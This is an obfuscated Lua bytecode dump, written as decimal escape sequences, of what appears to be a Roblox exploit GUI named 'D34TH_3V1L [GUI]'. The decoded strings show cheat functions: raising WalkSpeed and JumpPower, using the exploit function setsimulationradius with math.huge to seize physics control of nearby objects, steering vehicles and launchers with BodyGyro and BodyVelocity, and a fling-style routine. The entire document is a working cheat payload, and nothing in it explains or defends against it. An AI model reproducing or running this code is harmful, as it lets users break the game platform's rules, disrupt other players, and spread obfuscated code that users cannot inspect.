101\114\0\4\22\0\0\0\67\97\109\101\114\97\77\97\120\90\111\111\109\68\105\115\116\97\110\99\101\0\3\0\0\0\0\0\64\143\64\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\182\7\0\0\207\7\0\0\1\0\0\5\11\0\0\0\5\0\0\0\6\64\64\0\65\128\0\0\132\0\0\0\28\128\128\1\70\192\64\0\134\0\193\0\139\64\65\1\36\1\0\0\156\64\128\1\30\0\128\0\6\0\0\0\4\9\0\0\0\73\110\115\116\97\110\99\101\0\4\4\0\0\0\110\101\119\0\4\12\0\0\0\76\111\99\97\108\83\99\114\105\112\116\0\4\7\0\0\0\80\97\114\101\110\116\0\4\18\0\0\0\77\111\117\115\101\66\117\116\116\111\110\49\67\108\105\99\107\0\4\8\0\0\0\67\111\110\110\101\99\116\0\1\0\0\0\0\0\0\0\188\7\0\0\206\7\0\0\0\0\0\6\12\0\0\0\2\0\0\0\69\0\0\0\70\64\192\0\70\128\192\0\139\192\192\0\156\128\0\1\198\0\65\1\203\64\193\1\100\1\0\0\0\0\0\0\220\64\128\1\30\0\128\0\6\0\0\0\4\5\0\0\0\103\97\109\101\0\4\8\0\0\0\80\108\97\121\101\114\115\0\4\12\0\0\0\76\111\99\97\108\80\108\97\121\101\114\0\4\9\0\0\0\71\101\116\77\111\117\115\101\0\4\8\0\0\0\75\101\121\68\111\119\110\0\4\8\0\0\0\99\111\110\110\101\99\116\0\1\0\0\0\0\0\0\0\193\7\0\0\205\7\0\0\1\1\0\2\52\0\0\0\23\0\64\0\22\192\5\128\68\0\0\0\23\64\192\0\22\0\5\128\66\0\128\0\72\0\0\0\69\128\0\0\70\192\192\0\70\0\193\0\70\64\193\0\70\128\193\0\73\0\194\131\69\128\0\0\70\192\192\0\70\0\193\0\70\64\193\0\70\0\194\0\73\128\194\132\69\128\0\0\70\192\192\0\70\0\193\0\70\64\193\0\70\0\194\0\73\0\195\133\22\0\6\128\23\0\64\0\22\128\5\128\68\0\0\0\23\64\195\0\22\192\4\128\66\0\0\0\72\0\0\0\69\128\0\0\70\192\192\0\70\0\193\0\70\64\193\0\70\0\194\0\73\128\195\132\69\128\0\0\70\192\192\0\70\0\193\0\70\64\193\0\70\0\194\0\73\192\195\133\69\128\0\0\70\192\192\0\70\0\193\0\70\64\193\0\70\0\194\0\73\128\193\131\30\0\128\0\16\0\0\0\4\2\0\0\0\122\0\1\0\4\5\0\0\0\103\97\109\101\0\4\8\0\0\0\80\108\97\121\101\114\115\0\4\12\0\0\0\76\111\99\97\108\80\108\97\121\101\114\0\4\10\0\0\0\67\104\97\114\97\99\116\101\114\0\4\9\0\0\0\72\117\109\97\110\111\105\100\0\4\5\0\0\0\78\97\109\101\0\4\5\0\0\0\72\117\109\122\0\4\10\0\0\0\87\97\108\107\83\112\101\101\100\0\3\0\0\0\0\0\0\89\64\4\10\0\0\0\74\117\109\112\80\111\119\101\114\0\3\0\0\0\0\0\0\105\64\1\1\3\0\0\0\0\0\0\48\64\3\0\0\0\0\0\0\73\64\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\209\7\0\0\221\7\0\0\1\0\0\5\11\0\0\0\5\0\0\0\6\64\64\0\65\128\0\0\132\0\0\0\28\128\128\1\70\192\64\0\134\0\193\0\139\64\65\1\36\1\0\0\156\64\128\1\30\0\128\0\6\0\0\0\4\9\0\0\0\73\110\115\116\97\110\99\101\0\4\4\0\0\0\110\101\119\0\4\12\0\0\0\76\111\99\97\108\83\99\114\105\112\116\0\4\7\0\0\0\80\97\114\101\110\116\0\4\18\0\0\0\77\111\117\115\101\66\117\116\116\111\110\49\67\108\105\99\107\0\4\8\0\0\0\67\111\110\110\101\99\116\0\1\0\0\0\0\0\0\0\214\7\0\0\220\7\0\0\0\0\0\9\26\0\0\0\5\0\0\0\69\64\0\0\75\128\192\0\193\192\0\0\92\128\128\1\70\0\193\0\70\64\193\0\75\128\193\0\92\0\0\1\28\0\1\0\22\192\2\128\75\193\65\2\193\1\2\0\92\129\128\1\90\1\0\0\22\128\1\128\69\129\2\0\70\193\194\2\129\1\3\0\193\65\3\0\1\2\3\0\92\129\0\2\9\65\129\132\33\128\0\0\22\64\252\127\30\0\128\0\14\0\0\0\4\6\0\0\0\112\97\105\114\115\0\4\5\0\0\0\103\97\109\101\0\4\11\0\0\0\71\101\116\83\101\114\118\105\99\101\0\4\8\0\0\0\80\108\97\121\101\114\115\0\4\12\0\0\0\76\111\99\97\108\80\108\97\121\101\114\0\4\10\0\0\0\67\104\97\114\97\99\116\101\114\0\4\12\0\0\0\71\101\116\67\104\105\108\100\114\101\110\0\4\4\0\0\0\105\115\65\0\4\5\0\0\0\84\111\111\108\0\4\8\0\0\0\71\114\105\112\80\111\115\0\4\8\0\0\0\86\101\99\116\111\114\51\0\4\4\0\0\0\110\101\119\0\3\0\0\0\0\0\0\36\64\3\0\0\0\0\0\0\36\192\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\223\7\0\0\55\8\0\0\1\0\0\5\11\0\0\0\5\0\0\0\6\64\64\0\65\128\0\0\132\0\0\0\28\128\128\1\70\192\64\0\134\0\193\0\139\64\65\1\36\1\0\0\156\64\128\1\30\0\128\0\6\0\0\0\4\9\0\0\0\73\110\115\116\97\110\99\101\0\4\4\0\0\0\110\101\119\0\4\12\0\0\0\76\111\99\97\108\83\99\114\105\112\116\0\4\7\0\0\0\80\97\114\101\110\116\0\4\18\0\0\0\77\111\117\115\101\66\117\116\116\111\110\49\67\108\105\99\107\0\4\8\0\0\0\67\111\110\110\101\99\116\0\1\0\0\0\0\0\0\0\228\7\0\0\54\8\0\0\0\0\0\15\250\0\0\0\1\0\0\0\67\0\128\0\133\64\0\0\134\128\64\1\134\192\64\1\202\0\0\0\10\129\1\0\9\65\65\130\9\65\65\131\9\65\193\131\9\65\65\132\9\65\193\132\9\65\65\133\75\193\66\1\92\129\0\1\134\1\195\2\139\65\67\3\36\2\0\0\0\0\0\2\156\65\128\1\134\129\195\2\139\65\67\3\36\66\0\0\0\0\0\2\156\65\128\1\133\65\0\0\134\193\67\3\134\1\68\3\139\65\68\3\156\129\0\1\154\1\0\0\22\0\54\128\134\129\68\1\154\65\0\0\22\128\0\128\134\193\68\1\139\65\68\3\156\129\0\1\139\1\69\3\1\66\5\0\156\129\128\1\134\129\69\3\198\193\69\1\203\1\198\3\65\66\6\0\220\129\128\1\218\1\0\0\22\64\7\128\198\193\69\1\198\65\198\3\203\1\198\3\65\130\6\0\220\129\128\1\218\1\0\0\22\128\5\128\198\193\69\1\198\65\198\3\198\129\198\3\203\1\198\3\65\194\6\0\220\129\128\1\218\1\0\0\22\128\3\128\198\193\69\1\198\65\198\3\198\129\198\3\198\193\198\3\198\1\199\3\5\130\7\0\6\194\71\4\79\2\72\0\78\66\200\4\129\130\8\0\193\194\8\0\1\131\8\0\28\130\128\2\201\1\130\142\22\64\7\128\198\193\69\1\198\65\198\3\198\129\198\3\198\1\201\3\11\66\201\3\28\130\0\1\9\194\70\147\69\130\7\0\70\194\199\4\129\2\10\0\193\130\8\0\1\67\10\0\65\131\10\0\92\130\128\2\9\66\130\147\70\2\71\4\133\2\11\0\134\66\75\5\193\130\11\0\1\195\11\0\65\131\8\0\156\130\0\2\73\130\130\149\70\2\76\4\70\66\204\4\73\130\204\152\70\194\76\4\73\194\70\154\70\66\205\3\9\66\130\154\87\128\77\3\22\64\31\128\203\193\77\3\69\66\0\0\70\2\206\4\70\66\206\4\220\129\128\1\218\1\0\0\22\128\29\128\87\64\0\3\22\64\14\128\90\0\0\0\22\64\1\128\198\129\206\0\203\193\206\3\220\65\0\1\198\1\207\0\203\193\206\3\220\65\0\1\64\0\0\3\193\65\10\0\1\66\15\0\65\66\10\0\224\1\4\128\198\130\130\1\218\2\0\0\22\0\1\128\198\130\130\1\198\66\207\5\6\131\130\1\6\67\74\6\201\2\131\154\198\66\77\3\198\130\207\5\10\3\0\1\70\67\77\3\128\3\128\5\34\67\0\1\201\0\3\5\11\195\207\5\28\67\0\1\223\65\251\127\197\1\16\0\198\193\199\3\1\66\16\0\64\2\0\3\220\129\128\1\201\1\79\147\5\2\16\0\6\194\71\4\65\130\16\0\128\2\0\3\28\130\128\1\9\130\78\147\69\2\17\0\70\194\199\4\129\66\17\0\193\66\17\0\1\67\17\0\92\130\0\2\201\65\130\161\69\2\17\0\70\194\199\4\129\66\17\0\193\66\17\0\1\67\17\0\92\130\0\2\9\66\2\163\22\128\14\128\198\1\79\3\5\2\18\0\6\66\82\4\6\130\82\4\201\1\130\163\197\193\18\0\198\193\199\3\1\130\8\0\65\130\8\0\129\130\8\0\220\129\0\2\6\194\65\2\26\2\0\0\22\128\1\128\5\194\18\0\6\194\71\4\65\130\8\0\129\130\8\0\210\2\0\0\28\130\0\2\206\1\130\3\6\66\66\2\26\2\0\0\22\128\1\128\5\194\18\0\6\194\71\4\65\130\8\0\129\130\8\0\192\2\0\0\28\130\0\2\206\1\130\3\6\2\66\2\26\2\0\0\22\128\1\128\5\194\18\0\6\194\71\4\82\2\0\0\129\130\8\0\193\130\8\0\28\130\0\2\206\1\130\3\6\130\66\2\26\2\0\0\22\128\1\128\5\194\18\0\6\194\71\4\64\2\0\0\129\130\8\0\193\130\8\0\28\130\0\2\206\1\130\3\6\130\78\3\70\194\82\3\78\194\129\4\70\66\211\4\134\194\82\3\134\66\83\5\77\130\130\4\9\66\2\166\198\129\65\2\218\1\0\0\22\128\0\128\24\0\72\0\22\0\0\128\12\64\74\0\198\1\65\2\218\1\0\0\22\192\200\127\24\0\0\145\22\64\200\127\13\64\74\0\22\192\199\127\30\0\128\0\78\0\0\0\3\0\0\0\0\0\0\52\64\4\5\0\0\0\103\97\109\101\0\4\8\0\0\0\80\108\97\121\101\114\115\0\4\12\0\0\0\76\111\99\97\108\80\108\97\121\101\114\0\4\2\0\0\0\113\0\1\0\4\2\0\0\0\101\0\4\2\0\0\0\119\0\4\2\0\0\0\97\0\4\2\0\0\0\115\0\4\2\0\0\0\100\0\4\9\0\0\0\71\101\116\77\111\117\115\101\0\4\8\0\0\0\75\101\121\68\111\119\110\0\4\8\0\0\0\99\111\110\110\101\99\116\0\4\6\0\0\0\75\101\121\85\112\0\4\11\0\0\0\82\117\110\83\101\114\118\105\99\101\0\4\8\0\0\0\83\116\101\112\112\101\100\0\4\5\0\0\0\119\97\105\116\0\4\10\0\0\0\67\104\97\114\97\99\116\101\114\0\4\15\0\0\0\67\104\97\114\97\99\116\101\114\65\100\100\101\100\0\4\13\0\0\0\87\97\105\116\70\111\114\67\104\105\108\100\0\4\9\0\0\0\72\117\109\97\110\111\105\100\0\4\9\0\0\0\83\101\97\116\80\97\114\116\0\4\10\0\0\0\80\108\97\121\101\114\71\117\105\0\4\15\0\0\0\70\105\110\100\70\105\114\115\116\67\104\105\108\100\0\4\14\0\0\0\77\97\105\110\83\99\114\101\101\110\71\117\105\0\4\4\0\0\0\66\97\114\0\4\6\0\0\0\83\112\101\101\100\0\4\4\0\0\0\98\97\114\0\4\5\0\0\0\83\105\122\101\0\4\6\0\0\0\85\68\105\109\50\0\4\4\0\0\0\110\101\119\0\3\0\0\0\0\0\0\89\64\3\102\102\102\102\102\102\238\63\3\0\0\0\0\0\0\0\0\3\143\194\245\40\92\143\234\63\4\3\0\0\0\72\80\0\4\6\0\0\0\67\108\111\110\101\0\4\5\0\0\0\78\97\109\101\0\4\9\0\0\0\80\111\115\105\116\105\111\110\0\3\0\0\0\0\0\0\224\63\3\0\0\0\0\0\0\240\63\3\0\0\0\0\0\0\94\192\4\17\0\0\0\66\97\99\107\103\114\111\117\110\100\67\111\108\111\114\51\0\4\7\0\0\0\67\111\108\111\114\51\0\4\8\0\0\0\102\114\111\109\82\71\66\0\3\0\0\0\0\0\224\111\64\3\0\0\0\0\0\96\99\64\4\8\0\0\0\80\105\99\116\117\114\101\0\4\6\0\0\0\73\109\97\103\101\0\4\23\0\0\0\114\98\120\97\115\115\101\116\105\100\58\47\47\49\56\49\48\51\53\55\49\55\0\4\10\0\0\0\84\101\120\116\76\97\98\101\108\0\4\5\0\0\0\84\101\120\116\0\4\7\0\0\0\80\97\114\101\110\116\0\0\4\15\0\0\0\73\115\68\101\115\99\101\110\100\97\110\116\79\102\0\4\10\0\0\0\87\111\114\107\115\112\97\99\101\0\4\9\0\0\0\86\101\104\105\99\108\101\115\0\4\4\0\0\0\86\101\108\0\4\8\0\0\0\68\101\115\116\114\111\121\0\4\5\0\0\0\71\121\114\111\0\3\0\0\0\0\0\0\0\64\4\6\0\0\0\87\104\101\101\108\0\4\7\0\0\0\114\101\109\111\118\101\0\4\9\0\0\0\73\110\115\116\97\110\99\101\0\4\9\0\0\0\66\111\100\121\71\121\114\111\0\4\13\0\0\0\66\111\100\121\86\101\108\111\99\105\116\121\0\4\10\0\0\0\109\97\120\84\111\114\113\117\101\0\4\8\0\0\0\86\101\99\116\111\114\51\0\3\0\0\0\208\136\195\0\66\4\9\0\0\0\77\97\120\70\111\114\99\101\0\4\7\0\0\0\99\102\114\97\109\101\0\4\10\0\0\0\119\111\114\107\115\112\97\99\101\0\4\14\0\0\0\67\117\114\114\101\110\116\67\97\109\101\114\97\0\4\16\0\0\0\67\111\111\114\100\105\110\97\116\101\70\114\97\109\101\0\4\7\0\0\0\67\70\114\97\109\101\0\4\9\0\0\0\86\101\108\111\99\105\116\121\0\4\2\0\0\0\112\0\2\0\0\0\0\0\0\0\236\7\0\0\241\7\0\0\1\1\0\3\9\0\0\0\75\0\64\0\92\128\0\1\132\0\0\0\134\64\0\1\87\64\64\1\22\64\0\128\132\0\0\0\137\128\192\0\30\0\128\0\3\0\0\0\4\6\0\0\0\108\111\119\101\114\0\0\1\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\243\7\0\0\248\7\0\0\1\1\0\3\9\0\0\0\75\0\64\0\92\128\0\1\132\0\0\0\134\64\0\1\87\64\64\1\22\64\0\128\132\0\0\0\137\128\192\0\30\0\128\0\3\0\0\0\4\6\0\0\0\108\111\119\101\114\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\57\8\0\0\140\8\0\0\1\0\0\5\11\0\0\0\5\0\0\0\6\64\64\0\65\128\0\0\132\0\0\0\28\128\128\1\70\192\64\0\134\0\193\0\139\64\65\1\36\1\0\0\156\64\128\1\30\0\128\0\6\0\0\0\4\9\0\0\0\73\110\115\116\97\110\99\101\0\4\4\0\0\0\110\101\119\0\4\12\0\0\0\76\111\99\97\108\83\99\114\105\112\116\0\4\7\0\0\0\80\97\114\101\110\116\0\4\18\0\0\0\77\111\117\115\101\66\117\116\116\111\110\49\67\108\105\99\107\0\4\8\0\0\0\67\111\110\110\101\99\116\0\1\0\0\0\0\0\0\0\63\8\0\0\139\8\0\0\0\0\0\10\58\0\0\0\5\0\0\0\6\64\64\0\11\128\64\0\129\192\0\0\202\192\0\0\201\64\65\130\201\192\65\131\201\64\66\132\28\64\0\2\1\64\2\0\65\128\2\0\133\0\0\0\134\192\66\1\134\0\67\1\203\64\67\1\220\128\0\1\3\1\128\2\138\129\1\0\137\193\67\135\137\193\67\136\137\193\195\136\137\193\67\137\137\193\195\137\137\193\67\138\197\1\0\0\203\65\197\3\65\130\5\0\220\129\128\1\198\193\197\3\203\1\198\3\100\2\0\0\0\0\0\1\0\0\0\0\0\0\0\2\0\0\128\1\0\0\0\3\220\65\128\1\198\65\198\1\203\1\198\3\100\66\0\0\0\0\0\3\220\65\128\1\198\129\198\1\203\1\198\3\100\130\0\0\0\0\0\3\220\65\128\1\197\1\0\0\198\193\198\3\198\1\199\3\198\65\199\3\203\1\198\3\100\194\0\0\0\0\0\1\0\0\0\2\0\0\0\0\220\65\128\1\30\0\128\0\30\0\0\0\4\5\0\0\0\103\97\109\101\0\4\11\0\0\0\83\116\97\114\116\101\114\71\117\105\0\4\8\0\0\0\83\101\116\67\111\114\101\0\4\17\0\0\0\83\101\110\100\78\111\116\105\102\105\99\97\116\105\111\110\0\4\6\0\0\0\84\105\116\108\101\0\4\17\0\0\0\68\51\52\84\72\95\51\86\49\76\32\91\71\85\73\93\0\4\5\0\0\0\84\101\120\116\0\4\61\0\0\0\82\80\71\32\67\111\110\116\114\111\108\32\101\120\101\99\117\116\101\100\44\32\112\114\101\115\115\32\69\32\116\111\32\115\112\101\101\100\32\117\112\32\97\110\100\32\81\32\116\111\32\115\108\111\119\32\100\111\119\110\0\4\9\0\0\0\68\117\114\97\116\105\111\110\0\3\0\0\0\0\0\0\52\64\3\0\0\0\0\0\0\8\64\4\8\0\0\0\80\108\97\121\101\114\115\0\4\12\0\0\0\76\111\99\97\108\80\108\97\121\101\114\0\4\9\0\0\0\71\101\116\77\111\117\115\101\0\4\2\0\0\0\119\0\1\0\4\2\0\0\0\97\0\4\2\0\0\0\115\0\4\2\0\0\0\100\0\4\2\0\0\0\113\0\4\2\0\0\0\101\0\4\11\0\0\0\71\101\116\83\101\114\118\105\99\101\0\4\11\0\0\0\82\117\110\83\101\114\118\105\99\101\0\4\8\0\0\0\83\116\101\112\112\101\100\0\4\8\0\0\0\99\111\110\110\101\99\116\0\4\8\0\0\0\75\101\121\68\111\119\110\0\4\6\0\0\0\75\101\121\85\112\0\4\10\0\0\0\87\111\114\107\115\112\97\99\101\0\4\8\0\0\0\73\103\110\111\114\101\100\0\4\11\0\0\0\67\104\105\108\100\65\100\100\101\100\0\4\0\0\0\0\0\0\0\80\8\0\0\106\8\0\0\5\0\0\7\138\0\0\0\4\0\0\0\6\0\64\0\11\64\64\0\129\128\0\0\28\128\128\1\26\0\0\0\22\64\8\128\4\0\0\0\6\0\64\0\6\128\64\0\11\64\64\0\129\192\0\0\28\128\128\1\26\0\0\0\22\64\6\128\4\0\0\0\6\0\64\0\6\128\64\0\6\192\64\0\11\64\64\0\129\0\1\0\28\128\128\1\26\0\0\0\22\0\4\128\4\0\0\0\6\0\64\0\6\128\64\0\6\192\64\0\6\0\65\0\6\64\65\0\69\192\1\0\70\0\194\0\132\0\128\0\143\64\66\1\142\128\66\1\193\192\2\0\1\1\3\0\65\193\2\0\92\128\128\2\9\64\0\131\22\128\7\128\4\0\0\0\6\0\64\0\6\128\64\0\6\192\64\0\6\64\67\0\75\128\67\0\92\128\0\1\73\0\193\135\133\192\1\0\134\0\66\1\193\64\4\0\1\193\2\0\65\129\4\0\129\193\4\0\156\128\128\2\73\128\0\136\134\64\193\0\197\64\5\0\198\128\197\1\1\193\5\0\65\1\6\0\129\193\2\0\220\128\0\2\137\192\0\138\134\64\198\0\134\128\70\1\137\192\70\141\134\0\199\0\137\0\193\142\134\128\71\0\73\128\0\143\4\0\0\1\26\0\0\0\22\64\10\128\4\0\0\1\6\128\71\0\87\192\71\0\22\64\9\128\5\0\8\0\69\64\8\0\70\128\200\0\133\64\8\0\134\128\72\1\81\128\128\0\133\64\8\0\134\128\72\1\28\64\128\1\4\0\0\0\6\192\72\0\6\0\73\0\6\64\73\0\87\128\73\0\22\64\0\128\3\0\0\0\8\0\0\1\4\0\0\1\69\192\9\0\70\0\202\0\132\0\0\1\134\192\73\1\134\64\74\1\196\0\128\1\198\128\202\1\198\64\202\1\92\128\128\1\133\192\9\0\134\192\74\1\197\64\8\0\198\0\203\1\1\65\11\0\220\128\0\1\1\193\2\0\65\193\2\0\156\128\0\2\78\128\128\0\9\64\128\147\4\0\0\2\6\128\75\0\26\0\0\0\22\64\1\128\4\0\128\0\24\0\128\133\22\128\0\128\4\0\128\0\13\128\68\0\8\0\128\0\4\0\0\2\6\192\75\0\26\0\0\0\22\64\1\128\4\0\128\0\24\64\66\0\22\128\0\128\4\0\128\0\12\128\68\0\8\0\128\0\30\0\128\0\48\0\0\0\4\10\0\0\0\80\108\97\121\101\114\71\117\105\0\4\15\0\0\0\70\105\110\100\70\105\114\115\116\67\104\105\108\100\0\4\14\0\0\0\77\97\105\110\83\99\114\101\101\110\71\117\105\0\4\4\0\0\0\66\97\114\0\4\6\0\0\0\83\112\101\101\100\0\4\4\0\0\0\98\97\114\0\4\5\0\0\0\83\105\122\101\0\4\6\0\0\0\85\68\105\109\50\0\4\4\0\0\0\110\101\119\0\3\0\0\0\0\0\0\89\64\3\102\102\102\102\102\102\238\63\3\0\0\0\0\0\0\0\0\3\143\194\245\40\92\143\234\63\4\3\0\0\0\72\80\0\4\6\0\0\0\67\108\111\110\101\0\4\5\0\0\0\78\97\109\101\0\4\9\0\0\0\80\111\115\105\116\105\111\110\0\3\0\0\0\0\0\0\224\63\3\0\0\0\0\0\0\240\63\3\0\0\0\0\0\0\94\192\4\17\0\0\0\66\97\99\107\103\114\111\117\110\100\67\111\108\111\114\51\0\4\7\0\0\0\67\111\108\111\114\51\0\4\8\0\0\0\102\114\111\109\82\71\66\0\3\0\0\0\0\0\224\111\64\3\0\0\0\0\0\96\99\64\4\8\0\0\0\80\105\99\116\117\114\101\0\4\6\0\0\0\73\109\97\103\101\0\4\23\0\0\0\114\98\120\97\115\115\101\116\105\100\58\47\47\49\56\49\48\51\53\55\49\55\0\4\10\0\0\0\84\101\120\116\76\97\98\101\108\0\4\5\0\0\0\84\101\120\116\0\4\7\0\0\0\80\97\114\101\110\116\0\0\4\20\0\0\0\115\101\116\115\105\109\117\108\97\116\105\111\110\114\97\100\105\117\115\0\4\5\0\0\0\109\97\116\104\0\4\5\0\0\0\104\117\103\101\0\4\10\0\0\0\67\104\97\114\97\99\116\101\114\0\4\9\0\0\0\72\117\109\97\110\111\105\100\0\4\4\0\0\0\83\105\116\0\1\1\4\7\0\0\0\67\70\114\97\109\101\0\4\7\0\0\0\108\111\111\107\65\116\0\4\2\0\0\0\112\0\4\4\0\0\0\72\105\116\0\4\7\0\0\0\65\110\103\108\101\115\0\4\4\0\0\0\114\97\100\0\3\0\0\0\0\0\128\86\64\4\2\0\0\0\113\0\4\2\0\0\0\101\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\108\8\0\0\113\8\0\0\1\1\0\3\9\0\0\0\75\0\64\0\92\128\0\1\132\0\0\0\134\64\0\1\87\64\64\1\22\64\0\128\132\0\0\0\137\128\192\0\30\0\128\0\3\0\0\0\4\6\0\0\0\108\111\119\101\114\0\0\1\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\115\8\0\0\120\8\0\0\1\1\0\3\9\0\0\0\75\0\64\0\92\128\0\1\132\0\0\0\134\64\0\1\87\64\64\1\22\64\0\128\132\0\0\0\137\128\192\0\30\0\128\0\3\0\0\0\4\6\0\0\0\108\111\119\101\114\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\122\8\0\0\138\8\0\0\3\1\0\8\75\0\0\0\69\0\0\0\92\64\128\0\70\64\64\0\23\128\192\0\22\0\17\128\69\192\0\0\70\0\193\0\134\64\65\0\196\0\0\0\198\128\193\1\198\192\193\1\198\64\193\1\141\192\0\1\134\0\66\1\92\128\0\1\24\64\194\0\22\0\14\128\69\128\2\0\70\192\194\0\70\0\195\0\70\64\195\0\132\0\0\0\134\128\65\1\134\128\67\1\137\0\196\135\133\128\2\0\134\192\66\1\134\0\67\1\137\0\128\134\8\0\128\0\139\64\68\0\1\129\4\0\156\128\128\1\139\192\68\1\156\64\0\1\133\0\5\0\134\64\69\1\193\128\4\0\0\1\0\0\156\128\128\1\196\0\128\0\218\0\0\0\22\192\5\128\196\0\128\0\198\128\197\1\87\192\197\1\22\192\4\128\197\128\2\0\198\0\198\1\198\64\198\1\203\0\192\1\220\64\0\1\198\192\70\0\5\193\6\0\6\65\69\2\65\1\7\0\132\1\0\1\146\1\0\3\193\1\7\0\28\129\0\2\206\0\129\1\198\64\199\1\6\193\70\0\6\65\71\2\205\0\129\1\137\192\0\141\22\0\249\127\197\0\0\0\1\129\7\0\220\64\0\1\197\128\2\0\198\192\194\1\198\0\195\1\201\64\128\134\30\0\128\0\31\0\0\0\4\5\0\0\0\119\97\105\116\0\4\5\0\0\0\78\97\109\101\0\4\9\0\0\0\76\97\117\110\99\104\101\114\0\4\5\0\0\0\109\97\116\104\0\4\4\0\0\0\97\98\115\0\4\9\0\0\0\80\111\115\105\116\105\111\110\0\4\10\0\0\0\67\104\97\114\97\99\116\101\114\0\4\17\0\0\0\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116\0\4\10\0\0\0\77\97\103\110\105\116\117\100\101\0\3\0\0\0\0\0\0\62\64\4\5\0\0\0\103\97\109\101\0\4\10\0\0\0\87\111\114\107\115\112\97\99\101\0\4\14\0\0\0\67\117\114\114\101\110\116\67\97\109\101\114\97\0\4\14\0\0\0\67\97\109\101\114\97\83\117\98\106\101\99\116\0\4\9\0\0\0\72\117\109\97\110\111\105\100\0\4\4\0\0\0\83\105\116\0\1\1\4\13\0\0\0\87\97\105\116\70\111\114\67\104\105\108\100\0\4\13\0\0\0\66\111\100\121\86\101\108\111\99\105\116\121\0\4\8\0\0\0\68\101\115\116\114\111\121\0\4\9\0\0\0\73\110\115\116\97\110\99\101\0\4\4\0\0\0\110\101\119\0\4\7\0\0\0\80\97\114\101\110\116\0\0\4\11\0\0\0\82\117\110\83\101\114\118\105\99\101\0\4\8\0\0\0\83\116\101\112\112\101\100\0\4\9\0\0\0\86\101\108\111\99\105\116\121\0\4\7\0\0\0\67\70\114\97\109\101\0\3\0\0\0\0\0\0\0\0\4\2\0\0\0\112\0\3\0\0\0\0\0\0\224\63\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\142\8\0\0\168\8\0\0\1\0\0\5\11\0\0\0\5\0\0\0\6\64\64\0\65\128\0\0\132\0\0\0\28\128\128\1\70\192\64\0\134\0\193\0\139\64\65\1\36\1\0\0\156\64\128\1\30\0\128\0\6\0\0\0\4\9\0\0\0\73\110\115\116\97\110\99\101\0\4\4\0\0\0\110\101\119\0\4\12\0\0\0\76\111\99\97\108\83\99\114\105\112\116\0\4\7\0\0\0\80\97\114\101\110\116\0\4\18\0\0\0\77\111\117\115\101\66\117\116\116\111\110\49\67\108\105\99\107\0\4\8\0\0\0\67\111\110\110\101\99\116\0\1\0\0\0\0\0\0\0\149\8\0\0\167\8\0\0\0\0\0\5\14\0\0\0\1\0\0\0\69\64\0\0\70\128\192\0\70\192\192\0\133\64\0\0\134\0\65\1\134\64\65\1\134\128\65\1\139\192\65\1\36\1\0\0\0\0\128\0\0\0\0\0\156\64\128\1\30\0\128\0\8\0\0\0\3\0\0\0\0\0\0\105\64\4\5\0\0\0\103\97\109\101\0\4\8\0\0\0\80\108\97\121\101\114\115\0\4\12\0\0\0\76\111\99\97\108\80\108\97\121\101\114\0\4\10\0\0\0\87\111\114\107\115\112\97\99\101\0\4\8\0\0\0\73\103\110\111\114\101\100\0\4\11\0\0\0\67\104\105\108\100\65\100\100\101\100\0\4\8\0\0\0\99\111\110\110\101\99\116\0\1\0\0\0\0\0\0\0\156\8\0\0\166\8\0\0\2\1\0\7\62\0\0\0\69\0\0\0\92\64\128\0\70\64\64\0\23\128\192\0\22\192\13\128\69\192\0\0\70\0\193\0\134\64\65\0\196\0\0\0\198\128\193\1\198\192\193\1\198\64\193\1\141\192\0\1\134\0\66\1\92\128\0\1\24\64\194\0\22\192\10\128\75\128\66\0\193\192\2\0\92\128\128\1\75\0\195\0\92\64\0\1\69\64\3\0\70\128\195\0\129\192\2\0\192\0\0\0\92\128\128\1\134\0\68\0\197\0\4\0\198\128\195\1\1\65\4\0\68\1\128\0\82\1\128\2\129\65\4\0\220\128\0\2\142\192\0\1\134\128\68\1\198\0\68\0\198\128\196\1\141\192\0\1\73\128\128\135\26\0\0\0\22\64\4\128\70\192\68\0\87\0\197\0\22\128\3\128\69\64\5\0\70\128\197\0\70\192\197\0\75\0\192\0\92\64\0\1\69\0\6\0\133\192\0\0\134\64\70\1\197\192\0\0\198\64\198\1\145\192\0\1\197\192\0\0\198\64\198\1\92\64\128\1\22\192\250\127\30\0\128\0\26\0\0\0\4\5\0\0\0\119\97\105\116\0\4\5\0\0\0\78\97\109\101\0\4\9\0\0\0\76\97\117\110\99\104\101\114\0\4\5\0\0\0\109\97\116\104\0\4\4\0\0\0\97\98\115\0\4\9\0\0\0\80\111\115\105\116\105\111\110\0\4\10\0\0\0\67\104\97\114\97\99\116\101\114\0\4\17\0\0\0\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116\0\4\10\0\0\0\77\97\103\110\105\116\117\100\101\0\3\0\0\0\0\0\0\62\64\4\13\0\0\0\87\97\105\116\70\111\114\67\104\105\108\100\0\4\13\0\0\0\66\111\100\121\86\101\108\111\99\105\116\121\0\4\8\0\0\0\68\101\115\116\114\111\121\0\4\9\0\0\0\73\110\115\116\97\110\99\101\0\4\4\0\0\0\110\101\119\0\4\9\0\0\0\86\101\108\111\99\105\116\121\0\4\7\0\0\0\67\70\114\97\109\101\0\3\0\0\0\0\0\0\0\0\4\2\0\0\0\112\0\4\7\0\0\0\80\97\114\101\110\116\0\0\4\5\0\0\0\103\97\109\101\0\4\11\0\0\0\82\117\110\83\101\114\118\105\99\101\0\4\8\0\0\0\83\116\101\112\112\101\100\0\4\20\0\0\0\115\101\116\115\105\109\117\108\97\116\105\111\110\114\97\100\105\117\115\0\4\5\0\0\0\104\117\103\101\0\0\0\0\0\0\